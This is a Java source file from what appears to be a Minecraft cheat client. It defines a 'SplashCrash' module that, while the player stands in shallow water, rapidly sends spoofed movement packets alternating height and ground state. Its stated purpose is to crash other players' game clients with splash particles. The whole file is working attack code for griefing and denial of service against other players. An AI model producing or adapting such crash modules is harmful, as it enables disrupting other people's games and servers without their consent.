/*
 * Copyright (c) Shadow client, 0x150, Saturn5VFive 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.math.Vec3d;
import net.shadow.client.feature.gui.notifications.Notification;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;
import net.minecraft.client.util.math.MatrixStack;

public class SplashCrash extends Module {
    boolean ready = false;
    boolean s = false;
    public SplashCrash() {
        super("SplashCrash", "Crashes other players with water spashing particles", ModuleType.CRASH);
    }

    @Override
    public void tick() {
        ready = (client.player.isOnGround() && client.player.isTouchingWater());
    }

    @Override
    public void enable() {
        Notification.create(6000,"Splash", Notification.Type.WARNING,"Go into a one block shallow water to start");
    }

    @Override
    public void disable() {

    }

    @Override
    public String getContext() {
        return ready+"";
    }

    @Override
    public void onFastTick() {
        if (ready) {
            Vec3d pos = client.player.getPos();
            PlayerMoveC2SPacket.PositionAndOnGround p1;
            if (s) p1 = new PlayerMoveC2SPacket.PositionAndOnGround(pos.x,pos.y+1.2,pos.z,false);
            else p1 = new PlayerMoveC2SPacket.PositionAndOnGround(pos.x,pos.y+0.6,pos.z,true);
            s = !s;
            client.getNetworkHandler().sendPacket(p1);
        }
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }
}
